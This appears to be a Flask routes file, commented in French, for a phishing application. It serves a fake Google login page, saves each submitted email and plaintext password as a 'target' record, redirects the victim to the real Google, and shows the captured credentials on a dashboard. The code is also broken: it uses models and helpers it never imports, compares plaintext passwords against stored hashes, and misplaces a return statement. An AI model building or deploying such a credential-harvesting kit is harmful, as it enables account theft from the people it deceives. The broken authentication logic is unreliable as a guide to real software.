from flask import Flask, render_template, request, redirect, url_for, flash, session
from app.models import db, Cible, TemplateSite


def register_routes(app: Flask, db):
    @app.route("/")
    def hello_world():
        return render_template('index.html')

    @app.route("/connexion")
    def connexion():
        return render_template('pyconnexion.html')

    @app.route("/login", methods=["POST"])
    def login():
        email = request.form.get("username")
        mot_de_passe = request.form.get("password")

        # Chercher l'utilisateur dans la base de données
        utilisateur = Utilisateur.query.filter_by(email=email).first()

        if utilisateur and utilisateur.mot_de_passe == mot_de_passe:  # Comparaison directe sans hashage
            # Utilisateur authentifié, on démarre une session
            session["utilisateur_id"] = utilisateur.id
            flash("Connexion réussie!", "success")
            return redirect(url_for("dashboard"))
        else:
            flash("Email ou mot de passe incorrect", "danger")
            return redirect(url_for("connexion"))


    @app.route("/formulaire", methods=["GET", "POST"])
    def pyformulaire():
        if request.method == "POST":
            # Récupérer les données soumises par l'utilisateur
            username = request.form.get("username")
            password = request.form.get("password")

            # Vérifier si l'utilisateur existe déjà dans la base de données
            utilisateur = Utilisateur.query.filter_by(email=username).first()
            
            if utilisateur:
                flash("Cet utilisateur existe déjà.", "danger")
                return redirect(url_for("pyformulaire"))

            # Si l'utilisateur n'existe pas, on le crée
            mot_de_passe_hache = generate_password_hash(password)
            nouvel_utilisateur = Utilisateur(email=username, mot_de_passe=mot_de_passe_hache)
            db.session.add(nouvel_utilisateur)
            db.session.commit()

            flash("Inscription réussie! Vous pouvez maintenant vous connecter.", "success")
            return redirect(url_for("connexion"))

        # Afficher le formulaire d'inscription si la méthode est GET
        return render_template('pyformulaire.html')
    @app.route('/google', methods=['GET'])
    def fake_google():
        return render_template('fakeform.html')

    @app.route('/capture_gg', methods=['POST'])
    def capture():
        email = request.form.get('email')
        password = request.form.get('password')

        # Récupération du template "google"
        template = TemplateSite.query.filter_by(nom='google').first()

        cible = Cible(
            prenom=None,
            nom=None,
            email=email,
            mot_de_passe=password,
            site_id=template.id if template else None
        )

        db.session.add(cible)
        db.session.commit()

        return redirect("https://www.google.com")

    @app.route('/dashboard')
    def dashboard():
        pieges =  Cible.query.all()

        total_cibles = Cible.query.count()
        pieges_count = len(pieges)
  
    return render_template('pydashboard.html', pieges=pieges, pieges_count=pieges_count, total_cibles=total_cibles)

    @app.route("/pygoogle")
    def pygoogle():
        return render_template('pygoogle.html')
 